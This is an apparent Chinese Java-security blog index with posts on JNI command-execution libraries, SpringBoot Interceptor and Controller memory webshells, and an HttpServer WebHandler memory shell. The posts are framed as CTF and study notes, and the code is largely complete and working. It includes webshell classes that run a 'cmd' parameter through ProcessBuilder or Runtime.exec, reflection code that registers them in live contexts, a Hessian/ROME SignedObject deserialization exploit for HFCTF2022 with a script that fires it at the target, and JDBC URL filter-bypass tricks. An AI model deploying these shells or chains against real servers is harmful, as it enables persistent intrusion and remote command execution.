[{"title":"JNI","url":"/2025/05/03/JNI/","content":"利用手法目前知道的有两种，一种是.c直接编译成.dll；第二种是得到.h后编写对应.c，然后编译成.jnilib\n.c直接编译#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;//加载进内存前执行__attribute__ ((__constructor__)) void preload (void)&#123;    system(&quot;calc&quot;);&#125;\n\ngcc -shared -fPIC qwq.c -o hack.dll\npublic class Native &#123;    public native String exec(String cmd);&#125;\n\npublic class dll_Loader &#123;    public static void main(String[] args) &#123;        //加载根源的.dll，即.c文件直接编译的        System.load(&quot;your_path/poc.dll&quot;);        Native aNative = new Native();        aNative.exec(&quot;calc&quot;);    &#125;&#125;\n\n.jnilib这里写.jnilib只是为了便于区分，实际上.jinlib一般用与Mac，.dll用于windows，.so用于linux。根据情况选择\n先写Native.java\njavac Native.java 得到.class\njavah -jni Native 得到.h，注意，jdk10以后没有javah命令，需要换一下；Native的位置写完整包名\n然后编写包含.h的.c文件：\n#include &lt;jni.h&gt; // JNI 头文件#include &lt;stdlib.h&gt; // 提供 popen 和 pclose 函数#include &lt;stdio.h&gt; // 提供 fgets 和 FILE 操作#include &lt;string.h&gt; // 提供字符串操作函数#include &quot;Native.h&quot; // 假设这是 JNI 的头文件//命名规则：Java_类的全限定名_方法名JNIEXPORT jstring JNICALL Java_Native_exec(JNIEnv *env, jclass clazz, jstring str) &#123;    if (str != NULL) &#123;        jboolean isCopy;        // 将 jstring 参数转成 char 指针        const char *cmd = (*env)-&gt;GetStringUTFChars(env, str, &amp;isCopy);        if (cmd != NULL) &#123;            // 使用 popen 函数执行系统命令            FILE *fd = popen(cmd, &quot;r&quot;);            if (fd != NULL) &#123;                // 定义缓冲区和结果字符串                char buf[128];                char result[4096] = &#123;0&#125;; // 用于存储命令执行结果                // 读取 popen 的执行结果                while (fgets(buf, sizeof(buf), fd) != NULL) &#123;                    // 将读取到的内容拼接到结果字符串中                    strcat(result, buf);                &#125;                // 关闭 popen                pclose(fd);                // 返回命令执行结果给 Java                jstring ret = (*env)-&gt;NewStringUTF(env, result);                (*env)-&gt;ReleaseStringUTFChars(env, str, cmd); // 释放字符串资源                return ret;            &#125;            (*env)-&gt;ReleaseStringUTFChars(env, str, cmd); // 如果 popen 失败，也要释放字符串资源        &#125;    &#125;    return NULL; // 如果输入为空或执行失败，返回 NULL&#125;\n\n执行 gcc -I”D:\\sec_software\\jdks\\jdk-1.8.0_341\\include” -I”D:\\sec_software\\jdks\\jdk-1.8.0_341\\include\\win32” -shared -o poc.jnilib Native.c\n得到.jnilib\npublic class Native_Caller &#123;    public static void main(String[] args) &#123;        Native aNative = new Native();        System.load(&quot;your_path\\\\poc.jnilib&quot;);        aNative.exec(&quot;calc&quot;);    &#125;&#125;\n\n三种.jnilib加载的方法\n        //加载方法1//        File file = new File(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\java-challenges\\\\SUCTF\\\\suctf2025\\\\ez_solon\\\\src\\\\main\\\\java\\\\poc.jnilib&quot;);//        Method method = ClassLoader.class.getDeclaredMethod(&quot;loadLibrary0&quot;, Class.class, File.class);//        method.setAccessible(true);        //这个Native.class一般不会存在于服务器，需要我们通过字节码去加载//        method.invoke(Thread.currentThread().getContextClassLoader(), Native.class, file);        //加载方法2        System.load(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\1diot9\\\\java-challenges\\\\SUCTF\\\\suctf2025\\\\ez_solon\\\\src\\\\main\\\\java\\\\poc.jnilib&quot;);        //加载方法3，失败//        Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;);//        Method method1 = aClass.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class, boolean.class);//        method1.setAccessible(true);//        method1.invoke(null, file.getAbsolutePath(), false, false);\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"SpringBoot-Interceptor内存马","url":"/2025/05/04/SpringBoot-Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/","content":"前置知识这里主要讲一下SpringBoot里的各种组件和它们的作用与关系。首先需要知道什么是SpringMVC。MVC就是Model-View-Controller。SpringBoot中内置了SpringMVC，并帮助你把一些繁琐的配置做好了(不需要写web.xml)，使程序员只需要关注业务代码。SpringMVC里有几个重要的部分，分别是DispatcherServlet，HandlerAdapter，Handler。下面简单介绍一下。先看一张图，建立基本认识：\n下面的内容是我问AI的，还挺清楚，大家有什么不懂的也可以直接问AI。\n首先是HandlerAdapter和Handler：在 Spring MVC 中，HandlerAdapter 和 Handler 是两个非常重要的概念，它们在请求处理过程中扮演着不同的角色。为了更好地理解它们的区别和作用，我们先分别解释一下这两个概念，然后再对比它们的不同之处。\nHandler&amp;HandlerAdapter\nHandler（处理器）\n定义：Handler 是一个接口，表示能够处理 HTTP 请求的对象。它通常是控制器（Controller）的一个实例，负责处理特定的 URL 请求。\n功能：Handler 的主要职责是根据传入的请求参数执行相应的业务逻辑，并返回一个 ModelAndView 或其他类型的响应结果。\n实现方式：\n在 Spring MVC 中，最常见的是使用注解驱动的控制器（如 @Controller 或 @RestController），这些控制器类就是 Handler 的具体实现。\n除了注解驱动的方式，Spring MVC 还支持基于接口的控制器（如 Controller 接口），但这种方式已经较少使用。示例：@Controllerpublic class MyController {  @GetMapping(“&#x2F;hello”)public String hello(Model model) {model.addAttribute(“message”, “Hello, World!”);return “hello”;  &#x2F;&#x2F; 返回视图名称}\n\n}\n在这个例子中，MyController 就是一个 Handler，它处理 &#x2F;hello 路径的 GET 请求。\n\nHandlerAdapter（处理器适配器）\n定义：HandlerAdapter 是一个接口，它的作用是将不同类型的 Handler 统一为一种标准的处理方式。它负责调用具体的 Handler 并处理请求。\n功能：HandlerAdapter 的主要职责是将请求交给合适的 Handler 处理，并将处理结果转换为 ModelAndView 或其他响应形式。它充当了框架与具体处理器之间的桥梁。\n实现方式：\nSpring MVC 内置了多种 HandlerAdapter 实现，用于处理不同类型的 Handler。例如：\nRequestMappingHandlerAdapter：用于处理基于注解的控制器（如 @Controller、@RestController）。\nSimpleControllerHandlerAdapter：用于处理实现了 Controller 接口的传统控制器。\nHttpRequestHandlerAdapter：用于处理实现了 HttpRequestHandler 接口的处理器。示例：@RequestMappingHandlerAdapter adapter &#x3D; new RequestMappingHandlerAdapter();adapter.handle(request, response, handler);\n\n在这个例子中，RequestMappingHandlerAdapter 是一个 HandlerAdapter，它负责调用注解驱动的控制器来处理请求。\n\nHandler 和 HandlerAdapter 的区别\n特性Handler（处理器）HandlerAdapter（处理器适配器）角色具体的请求处理者调用并适配不同的 Handler职责执行业务逻辑，处理请求将请求分发给合适的 Handler类型可以是注解驱动的控制器、命令对象等是一个适配器，负责统一处理流程数量可以有多个 Handler通常只有一个或少数几个 HandlerAdapter调用关系Handler 由 HandlerAdapter 调用HandlerAdapter 由 DispatcherServlet 调用\n\n\n工作流程\n在 Spring MVC 中，请求的处理流程如下：1.请求到达：用户发起 HTTP 请求，请求被发送到 DispatcherServlet。2.查找 Handler：DispatcherServlet 使用 HandlerMapping 来查找匹配的 Handler。3.调用 HandlerAdapter：找到合适的 Handler 后，DispatcherServlet 会使用 HandlerAdapter 来调用该 Handler。4.处理请求：HandlerAdapter 调用具体的 Handler，执行业务逻辑。5.返回结果：Handler 处理完请求后，返回一个 ModelAndView 或其他类型的响应结果。6.渲染视图：DispatcherServlet 根据返回的结果选择合适的视图进行渲染，并将响应返回给客户端。\n\n\n总结\nHandler 是实际处理请求的对象，通常是控制器类，负责执行业务逻辑。\nHandlerAdapter 是一个适配器，它负责将请求分发给合适的 Handler，并确保所有类型的 Handler 都能以统一的方式被调用。简单来说，HandlerAdapter 是一个中间层，它使得 Spring MVC 可以灵活地支持多种类型的 Handler，而不需要改变核心的请求处理流程。\nDispatcherServlet然后是DispatcherServlet：DispatcherServlet 是 Spring MVC 框架中的核心组件，它是整个 Web 请求处理流程的前端控制器（Front Controller）。所有的 HTTP 请求都会通过 DispatcherServlet 进行分发和处理。它负责协调 Spring MVC 的各个组件，完成从请求到响应的整个生命周期管理。\n\n\nDispatcherServlet 的作用DispatcherServlet 的作用\n统一入口：DispatcherServlet 是 Spring MVC 的前端控制器，所有的 HTTP 请求都会被转发到这里。\n请求分发：根据请求的 URL 和配置，DispatcherServlet 负责将请求分发给合适的处理器（Handler）。\n组件协作：DispatcherServlet 协调了 Spring MVC 中的多个组件（如 HandlerMapping、HandlerAdapter、ViewResolver 等），确保请求能够被正确处理并返回响应。\n\n\nDispatcherServlet 的工作流程\n当一个 HTTP 请求到达时，DispatcherServlet 的主要工作流程如下：1.接收请求：\n用户发起 HTTP 请求，请求被发送到 DispatcherServlet。2.查找 Handler：\nDispatcherServlet 使用 HandlerMapping 来查找能够处理该请求的 Handler（处理器）。\nHandlerMapping 根据请求的 URL、HTTP 方法等信息，匹配到对应的 Handler。3.调用 HandlerAdapter：\n找到合适的 Handler 后，DispatcherServlet 使用 HandlerAdapter 来调用该 Handler。\nHandlerAdapter 是一个适配器，负责调用不同类型的 Handler 并统一返回结果。4.执行业务逻辑：\nHandler（通常是控制器类）执行具体的业务逻辑，并返回一个 ModelAndView 对象，其中包含模型数据和视图名称。5.解析视图：\nDispatcherServlet 使用 ViewResolver 将视图名称解析为具体的视图对象（如 JSP、Thymeleaf 等）。6.渲染视图：\n视图对象根据模型数据进行渲染，生成最终的 HTML 页面或其他形式的响应内容。7.返回响应：\n渲染完成后，DispatcherServlet 将响应内容返回给客户端。\n\n\nDispatcherServlet 的初始化\n在应用程序启动时，DispatcherServlet 会被初始化。它的初始化过程包括以下几个步骤：1.加载 WebApplicationContext：\nDispatcherServlet 会创建并加载一个独立的 Web 应用上下文（WebApplicationContext），用于存储与 Web 相关的 Bean。2.注册组件：\n初始化过程中，DispatcherServlet 会注册一系列关键组件，例如：\nHandlerMapping：用于匹配请求和处理器。\nHandlerAdapter：用于调用处理器。\nViewResolver：用于解析视图名称。\n其他组件（如异常处理器、拦截器等）。3.准备就绪：\n初始化完成后，DispatcherServlet 准备好接收和处理 HTTP 请求。\n\n\nDispatcherServlet 的配置在传统的 Spring MVC 项目中，DispatcherServlet 通常通过 web.xml 配置文件进行声明。例如：\n&lt;servlet&gt;    &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;    &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n\n在 Spring Boot 中，DispatcherServlet 的配置被自动简化，开发者不需要手动编写 web.xml 文件。Spring Boot 会自动配置 DispatcherServlet 并将其映射到 &#x2F; 路径。\nDispatcherServlet 的重要性\n单一入口：DispatcherServlet 是整个 Spring MVC 请求处理流程的起点，所有的请求都必须经过它。\n解耦设计：通过 DispatcherServlet，Spring MVC 实现了请求处理的解耦设计，使得框架可以灵活扩展。\n可扩展性：开发者可以通过自定义 HandlerMapping、HandlerAdapter 或 ViewResolver 等组件，来实现特定的需求。\n\n总结DispatcherServlet 是 Spring MVC 的核心组件，作为前端控制器，它负责接收请求、分发请求、协调组件以及返回响应。它的存在使得 Spring MVC 的请求处理流程清晰且高效，同时提供了高度的灵活性和可扩展性。\n流程分析这里我们做分析的目的，主要是为了知道哪里添加了Interceptor，调用了Interceptor的preHandle方法。\n如上图，直接在DispatcherServlet#doDispatch断点。箭头所指处， 就是开头那张图片的第一步，请求查询Handler，我们跟进。\n继续跟进上图中的getHandler。\n来到了AbstractHandlerMapping，我们继续跟进getHandlerExecutionChain。\n这里就是add Interceptor的地方了。这下我们的目标其实也明确了。通过反射拿到AbstractHandlerMapping的adaptedInterceptor属性，向这个属性里添加我们的interceptor。那么怎么拿到当前代码环境下的，也就是当前上下文里的AbstractHandlerMapping呢？通过获取WebApplicationContext可以做到。\n如上图，回到doDispatch，这里的mappedHandler就是一开始图片里的HandlerExectionChain。这里面包括两个interceptors和处理这个http请求需要用到的controller方法。\n如上图，第一个箭头拿HandlerAdapter，第二个调用Interceptor中的preHandle方法，第三个就是调用controller中的对应方法。这里不讲了，可以自己跟进看一下。\n下面这段可以作为反序列化sink的字节码动态加载。\npackage interceptor;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;//作为反序列化sink动态加载的字节码public class BadInterceptor extends HandlerInterceptorAdapter &#123;    public BadInterceptor() &#123;        try &#123;            //获得context            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);            //获取 adaptedInterceptors 属性值            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(&quot;requestMappingHandlerMapping&quot;);            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);            field.setAccessible(true);            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);            BadInterceptor aaa = new BadInterceptor(&quot;aaa&quot;);            adaptedInterceptors.add(aaa);        &#125;catch (Exception e)&#123;&#125;    &#125;    public BadInterceptor(String aaaa)&#123;&#125;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        String code = request.getParameter(&quot;bad&quot;);        if(code != null)&#123;            try &#123;                java.io.PrintWriter writer = response.getWriter();                String o = &quot;&quot;;                ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, code&#125;);                &#125;else&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, code&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;catch (Exception e)&#123;            &#125;            return false;        &#125;        return true;    &#125;&#125;\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"SpringBoot-Controller内存马","url":"/2025/05/05/SpringBoot-Controller%E5%86%85%E5%AD%98%E9%A9%AC/","content":"前置知识这里需要了解Spring IoC，Bean，ApplicationContext是什么。\n基本名词概念Spring IoC（Inversion of Control，控制反转）容器是Spring框架的核心组件之一，它负责管理应用程序中对象的创建、配置和生命周期。通过IoC容器，Spring实现了依赖注入（Dependency Injection, DI），从而降低了组件之间的耦合度，提高了代码的可维护性和可测试性。\nSpring IoC 容器主要功能\n对象的实例化：IoC容器会根据配置文件（如XML、Java注解或Java配置类）来创建对象实例。\n对象的配置：容器不仅负责创建对象，还会根据配置为对象设置属性值或注入依赖。\n对象的装配：容器会根据配置将不同的对象装配在一起，形成完整的应用上下文。\n对象的生命周期管理：容器可以管理对象的生命周期，包括初始化、运行时管理和销毁。\n\nSpring IoC 容器的实现方式Spring提供了两种主要的IoC容器实现：\n\nBeanFactory：这是Spring IoC容器的基础接口，提供基本的依赖注入功能。它是轻量级的，适合资源受限的环境。\nApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能，例如事件传播、国际化支持、AOP支持等。ApplicationContext是更常用的IoC容器实现。\n\n配置方式Spring IoC容器可以通过以下几种方式进行配置：\n\n基于XML的配置：使用XML文件定义Bean及其依赖关系。\n基于注解的配置：使用如@Component、@Service、@Autowired等注解来声明Bean和依赖注入。\n基于Java配置：使用@Configuration和@Bean注解以编程方式定义Bean。\n\n示例以下是一个简单的基于注解的Spring IoC容器示例：\n// 定义一个服务类，并使用 @Service 注解将其注册为 Bean@Servicepublic class MyService &#123;    public void execute() &#123;        System.out.println(&quot;MyService is executing...&quot;);    &#125;&#125;// 主程序类public class MainApp &#123;    public static void main(String[] args) &#123;        // 创建 Spring 应用上下文        ApplicationContext context = new AnnotationConfigApplicationContext(MainApp.class);        // 从容器中获取 MyService Bean        MyService myService = context.getBean(MyService.class);        myService.execute();    &#125;&#125;\n\n在这个例子中，MyService被注册为一个Bean，并通过IoC容器进行管理。主程序通过context.getBean()方法从容器中获取MyService实例。\n看完之后，我的理解是：\n1、Bean是Spring框架中的对象，而IoC是Bean的管理者\n2、IoC主要有两种实现方式，最基础的是BeanFactory，而它的一个重要子类是ApplicationContext\n3、如果我们能够获取IoC，比如ApplicationContext，那么我们就可以得到任何Bean，也就是得到某次请求中的Context中的任意对象\n这里简单解释一下Context。Context是上下文的意思，而上下文可以简单理解成一个进程运行时，各个类里面的变量等一切和这个进程有关的东西。\n分析之前是分析过Interceptor内存马的，所以我这里直接给EXP。这个EXP适用于springboot&lt;2.6.0\nWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 beanRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);// 2. 通过反射获得自定义 controller 中唯一的 Method 对象Method declaredMethod = Class.forName(&quot;bad_controller.BadController&quot;).getDeclaredMethods()[0];// 3. 定义访问 controller 的 URL 地址PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shellCon&quot;);// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();// 5. 在内存中动态注册 controllerRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);r.registerMapping(info, Class.forName(&quot;bad_controller.BadController&quot;).newInstance(), declaredMethod);return &quot;/shellCon has been added&quot;;\n\n这里获取上下文的方法还是一样。主要看看怎么动态注册Controller。\n还记得Interceptor里的那张图吗？DispatcherServlet先去跟HandlerMapping拿到对应的Controller里的方法和Interceptor，再进行后续处理。所以Controller里的方法是在HandlerMapping里被取出的，所以我们需要重点关注HandlerMapping。\n概括一下，先拿到HandlerMapping，再拿到Controller，再拿到Controller里具体的方法，再拿到路由和请求方式，最后注册即可。\nSpringBoot&gt;&#x3D;2.6.0的EXP：\nWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);configField.setAccessible(true);RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);Method method2 = InjectToController2.class.getMethod(&quot;test&quot;);RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();InjectToController2 springControllerMemShell = new InjectToController2(&quot;aaa&quot;);mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);\n\n内存马：\npackage bad_controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Controllerpublic class BadController &#123;    public void badCon(HttpServletRequest request, HttpServletResponse response) &#123;        String code = request.getParameter(&quot;cmd&quot;);        if(code != null)&#123;            try &#123;                java.io.PrintWriter writer = response.getWriter();                String o = &quot;&quot;;                ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, code&#125;);                &#125;else&#123;                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, code&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;catch (Exception e)&#123;            &#125;        &#125;    &#125;&#125;\n\n总结这里我只写了一种注册Controller的方法，获取context的过程也没细讲，可以去看参考文章里的。\n参考基于内存 Webshell 的无文件攻击技术研究-安全KER - 安全资讯平台\nSpring内存马学习\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"WebHandler内存马","url":"/2025/05/05/WebHandler%E5%86%85%E5%AD%98%E9%A9%AC/","content":"主要结合HFCTF2022-ezchain讲\n前言这里的hessian链比较容易，用原生jdk就可以打。不过这里不出网，所以要注入内存马，也就是需要加载字节码。这样原生jdk链虽然可以，但是比较繁琐。这里给了ROME链，就结合ROME链打一个二次反序列化。内存马是WebHandler，不太常见，学习一下。\n解题这里偷懒，照搬别人的了。\n首先是一个简单的hash碰撞，跟进去找到hashcode的计算方法：\n逻辑很简单，乘31后加就是。看最后两位，只要满足31a+b&#x3D;31c+d就行了，其中a&#x3D;50，b&#x3D;50，手算一个就行。这里找到其中一个，HFCTF201Q。\n接下来就是hessian反序列化。这里复现的时候一开始依赖没下完整，以为是打原生jdk，后来才看到有rome链。这里rome链直接放别人的了。\n二次反序列化Rome链SignedObject二次反序列化已经比较熟悉了。\n这里主要看看WebHandler内存马怎么写。\n正常基于tomcat和spring的内存马都是通过上下文来获取request对象，本题目直接使用http handler搭建服务，我们该如何实现动态注册呢？\n按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过Thread.currentThread()或Thread.getThreads()获取。\nThread.currentThread()–&gt;group–&gt;threads[1]–&gt;target–&gt;this$0–&gt;contexts–&gt;list[0]–&gt;handler\n内存马：\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.lang.reflect.Field;import java.lang.reflect.Method;public class memoryshell extends AbstractTranslet implements HttpHandler &#123;    static &#123;        //获取当前线程        Object o = Thread.currentThread();        try &#123;            Field groupField = o.getClass().getDeclaredField(&quot;group&quot;);            groupField.setAccessible(true);            Object group = groupField.get(o);            Field threadsField = group.getClass().getDeclaredField(&quot;threads&quot;);            threadsField.setAccessible(true);            Object t = threadsField.get(group);            Thread[] threads = (Thread[]) t;            for (Thread thread : threads)&#123;                if(thread.getName().equals(&quot;Thread-2&quot;))&#123;                    Field targetField = thread.getClass().getDeclaredField(&quot;target&quot;);                    targetField.setAccessible(true);                    Object target = targetField.get(thread);                    Field thisField = target.getClass().getDeclaredField(&quot;this$0&quot;);                    thisField.setAccessible(true);                    Object this$0 = thisField.get(target);                    Method createContext = Class.forName(&quot;sun.net.httpserver.ServerImpl&quot;).getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class);                    createContext.setAccessible(true);                    createContext.invoke(this$0,&quot;/shell&quot;,new memoryshell());                                    &#125;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    public void handle(HttpExchange t) throws IOException &#123;        String response = &quot;MemoryShell&quot;;        String query = t.getRequestURI().getQuery();        String[] var3 = query.split(&quot;=&quot;);        ByteArrayOutputStream output = null;        if (var3[0].equals(&quot;cmd&quot;))&#123;            InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();            output = new ByteArrayOutputStream();            byte[] buffer = new byte[4096];            int n = 0;            while (-1 != (n = inputStream.read(buffer))) &#123;                output.write(buffer, 0, n);            &#125;        &#125;        response+=(&quot;\\n&quot;+new String(output.toByteArray()));        t.sendResponseHeaders(200, (long)response.length());        OutputStream os = t.getResponseBody();        os.write(response.getBytes());        os.close();    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\nEXP:\npackage com.ctf.ezchain;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;import javax.xml.transform.Templates;public class memEXP &#123;    //为类的属性设置值    public static void setValue(Object target, String name, Object value) throws Exception &#123;        Field field = target.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(target,value);    &#125;    public static HashMap getObject() throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;D:\\\\tmp\\\\memshell\\\\memoryshell.class&quot;));        setValue(templates,&quot;_name&quot;, &quot;aaa&quot;);        setValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;bytecodes&#125;);        setValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());        //构造ToStringBean        ToStringBean toStringBean=new ToStringBean(Templates.class,templates);        ToStringBean toStringBean1=new ToStringBean(String.class,&quot;s&quot;);        //构造ObjectBean        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);        //构造HashMap        HashMap hashMap=new HashMap();        hashMap.put(objectBean,&quot;snakin&quot;);        //反射修改字段        Field obj=EqualsBean.class.getDeclaredField(&quot;obj&quot;);        Field equalsBean=ObjectBean.class.getDeclaredField(&quot;equalsBean&quot;);        obj.setAccessible(true);        equalsBean.setAccessible(true);        obj.set(equalsBean.get(objectBean),toStringBean);        return  hashMap;    &#125;    public static void main(String[] args) throws Exception &#123;        HashMap evilhashMap=getObject();        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(evilhashMap,privateKey,signingEngine);        ToStringBean toStringBean=new ToStringBean(SignedObject.class,signedObject);        ToStringBean toStringBean1=new ToStringBean(String.class,&quot;s&quot;);        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);        HashMap hashMap=new HashMap();        hashMap.put(objectBean,&quot;snakin&quot;);        Field obj= EqualsBean.class.getDeclaredField(&quot;obj&quot;);        Field equalsBean=ObjectBean.class.getDeclaredField(&quot;equalsBean&quot;);        obj.setAccessible(true);        equalsBean.setAccessible(true);        obj.set(equalsBean.get(objectBean),toStringBean);        Hessian2Output hessianOutput1 = new Hessian2Output(new FileOutputStream(&quot;D:\\\\tmp\\\\payload.bin&quot;));        hessianOutput1.writeObject(hashMap);        hessianOutput1.close();    &#125;&#125;\n\npython:\nimport requests url = &quot;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/?token=GeCTF2022&quot; with open(&quot;hession.ser&quot;, &quot;rb&quot;) as f:    content = f.read() requests.post(url=url, data=content) url = &quot;http://fc468662-a072-4ff6-af4c-aa53ea6a8273.node4.buuoj.cn:81/shell?cmd=cat /flag&quot;text = requests.get(url).textprint(text)\n\nUnixPrintService链这个这里先不讲了，之后单独开一篇文章\n参考CTF | 2022HFCTF ezchain\n2022虎符CTF-Java部分\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"mysql JDBC 绕过","url":"/2025/05/05/mysql-JDBC-%E7%BB%95%E8%BF%87/","content":"前言这里提到的绕过方法很基础。就是大小写，URL编码，参数拼接，#注释等，感觉跟php里的绕过很像。\n具体代码参考文末链接。\nfake-mysql可以使用4ra1n&#x2F;mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用)\n分析大小写绕过如果是这样检查的：\n那么可以直接大小写绕过。\n由于mysql里是这样判断参数值的：BooleanPropertyDefinition#parseObject()\n所以大小写不影响autoDeserialize的结果。\n另外，图片中看到YES和TRUE都可以，所以true被禁止时，不妨试试YES。还有，据说在低版本驱动中，1也可以。\nURL编码当检查通过URI类获取参数时，会自动解码URL，此时无法通过URL编码绕过，如下图：\n但是如果没有用URI类，那就可能存在URL编码绕过，如下图：\n参数拼接这个很常用，就是在可控输入点输入一长串达到恶意拼接参数的效果，最后用#把后面的语句注释掉，跟sql注入有点像。\n值得一提的是，6.x.x版本的mysql需要在末尾用&amp;#来注释，否则会报错，而8.x.x版本的#或&amp;#都可以。\n报错如下：\n这里应该是6.x.x以&amp;来分割参数，所以并不会把#当作结束符，而是继续当作参数读取。最后就会导致参数格式不合法，从而产生报错。\naddress绕过第一次遇到是在suctf2025的ezjava\n通过jdbc连接时支持这种语法：jdbc:mysql:&#x2F;&#x2F;address&#x3D;(host&#x3D;myhost)(port&#x3D;1111)(key1&#x3D;value1)&#x2F;db\n如果题目通过正则表达式匹配，可以通过这样的方法绕过，同时结合URL编码绕过关键字\n参考JDBC Attack URL 